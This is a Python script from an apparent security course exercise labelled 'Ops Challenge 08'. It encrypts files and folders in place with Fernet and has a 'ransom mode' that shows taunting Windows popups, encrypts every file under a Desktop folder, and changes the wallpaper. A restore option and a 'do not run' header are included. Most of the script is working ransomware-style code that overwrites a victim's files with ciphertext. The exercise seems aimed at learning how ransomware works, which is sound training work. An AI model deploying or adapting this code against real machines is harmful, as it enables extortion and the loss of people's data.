# Ops Challenge 08
# David Armstrong
# 10-15-2020
# Taking user input and encrypting folders recursively with addition of popups
# !!!For demonstration purposes. Do not run!

# Import Libraries
from cryptography.fernet import Fernet
import os
import bckgrnd
import win32ui, win32con
### FUNCTIONS ###
#Create Key
def write_key():
    # Generates a key and save it into a file
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

#Initialize the key
def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()

#Traverse directory tree and encrypt all files
def file_walk_en():
    start_path = r"C:\Users\Violinist\Desktop\test"
    for (root, dirs, files) in os.walk(start_path, topdown = False):
        for name in files:
            path = os.path.join(root, name)
            print("Accessing", name)
            encrypt_file(path, key)

#Traverse directory tree and decrypt all files
def file_walk_de():
    start_path = r"C:\Users\Violinist\Desktop\test"
    for (root, dirs, files) in os.walk(start_path, topdown = False):
        for name in files:
            path = os.path.join(root, name)
            print("Accessing", name)
            decrypt_file(path, key)

#Ask whether to encrypt or decrypt
def encr_decr():
    en_de = input("""Would you like to encrypt or decrypt the folder?
    \nPlease enter:\n1. To encrypt\n2. To decrypt\n>""")
    if (en_de == "1"):
        file_walk_en()
    else:
        file_walk_de()

#Decrypt a file
def decrypt_file(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write over the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    print("The file has now been decrypted.")

#Encrypt a file
def encrypt_file(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and writes it
    """
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypting_data = f.encrypt(file_data)
    #Write over the existing file
    with open(filename, "wb") as file:
        file.write(encrypting_data)
    print("The file has now been encrypted.")

#Encrypt a message
def enc_message():
    mess = input("Please enter a message to encrypt \n>>>")
    message = mess.encode()
    encrypted = f.encrypt(message)
    print("Here is the encrypted message: ")
    print(encrypted)

#Decrypt a message
def decr_message():
    f = Fernet(key)
    decrypting = input("Please enter a hash to decrypt \n>>>")
    #Change the data into bytes
    decrypts = bytes(decrypting, 'utf-8')
    unhash = f.decrypt(decrypts)
    unhashed = unhash.decode("utf-8")
    print("Here is the decrypted message: ")
    print(unhashed)

#Ask user if they want to manipulate a file or input a message
def user_input():
    num = int(input("Please select from the following options: \n 1. Encrypt a file \n 2. Decrypt a file \n 3. Encrypt a message \n 4. Decrypt a message \n >>>"))
    if (num == 1):
        filename = input("Please enter a file to encrypt \n>>>")
        if (filename == ""):
            filename = r"C:\Users\Violinist\Desktop\test\test.txt"
        encrypt_file(filename, key)
    elif (num == 2):
        filename = input("Please enter a file to decrypt \n>>>")
        if (filename == ""):
            filename = r"C:\Users\Violinist\Desktop\test\test.txt"
        decrypt_file(filename, key)
    elif (num == 3):
        enc_message()
    elif (num == 4):
        decr_message()

#Ask the user if they want to manipulate a file or folder
def file_or_folder():
    fi_fo = input("Would you like to work with a:\n1. File?\n 2. Contents of a folder?")
    if (fi_fo == "1"):
        user_input()
    else:
        global start_path
        start_path = input("Please enter a folder to encrypt (full path): \n >>>")
        if (start_path == ""):
            start_path = r"C:\Users\Violinist\Desktop\test"
        encr_decr()

# Restores the files and background
def restore():
    res = input("Would you like to restore the background and decrypt the files?\n>")
    if (res == "y"):
        file_walk_de()
        bckgrnd.restore()

#Popup windows "asking" the user if they want everything encrypted
def pop_up():
    response = win32ui.MessageBox("Having a good day?", "😉", win32con.MB_ICONASTERISK)
    response = win32ui.MessageBox("Would you like to encrypt your files?", "Hacked", win32con.MB_YESNO)
    if response == win32con.IDYES:
        win32ui.MessageBox("Why would you do that?!?", "Sucker!")
    elif response == win32con.IDNO:
        win32ui.MessageBox("Did you really think that would work?!?", "How Dare You!")
    #encrypt all files in the specified directory
    response = win32ui.MessageBox(":-)P  d(-:\nAs fun as this was...\nTake a look at your desktop!", "Bye, Bye", win32con.MB_ICONERROR)
    file_walk_en()
    bckgrnd.backg()

### MAIN ###
#Check to see if the key already exists; create if not
#print("Checking to see if there is an existing key...")
if os.path.exists("key.key"):
    #print ("There is already an existing key.")
    print("")
else:
    #print("Creating the key.")
    write_key()

# load the previously generated key
key = load_key()

# initialize the Fernet class
f = Fernet(key)

#Ask whether or not to run in ransom mode
pop = input("Would you like to run this in ransom mode?\n>")
if (pop == "y"):
    pop_up()
else:
    file_or_folder()

#Restore the background and files if requested
restore()
### END ###
